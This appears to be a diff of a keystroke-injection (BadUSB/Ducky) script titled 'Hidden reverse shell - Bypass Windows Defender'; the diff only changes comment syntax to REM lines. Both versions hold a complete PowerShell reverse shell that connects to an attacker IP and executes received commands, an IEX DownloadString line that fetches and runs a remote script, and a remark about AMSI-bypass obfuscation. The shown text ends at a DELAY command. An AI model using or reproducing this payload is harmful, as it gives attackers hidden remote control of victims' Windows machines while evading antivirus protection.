@@ -1,15 +1,15 @@
-#####################Powershell - Hidden reverse shell - Bypass Windows Defender#######################
+REM Powershell - Hidden reverse shell - Bypass Windows Defender
 
 
-######Prepare this .ps1 script on your attacker machine####################################################
-#
-# \$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',PORTNUMBER);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
-#
-##########################Don't forget ro start http server & your listener###########################
-#
-# IEX (New-Object Net.WebClient).DownloadString('http://ATACKER-IP:PORT/Invoke-Powershellshell.ps1')
-#
-########Obfuscated on https://amsi.fail/ should work for many IPs without a need to change############
+REM Prepare this .ps1 script on your attacker machine
+REM
+REM \$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',PORTNUMBER);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
+REM
+REM Don't forget ro start http server & your listener
+REM
+REM IEX (New-Object Net.WebClient).DownloadString('http://ATACKER-IP:PORT/Invoke-Powershellshell.ps1')
+REM
+REM Obfuscated on https://amsi.fail/ should work for many IPs without a need to change
 
 
 DELAY 1500
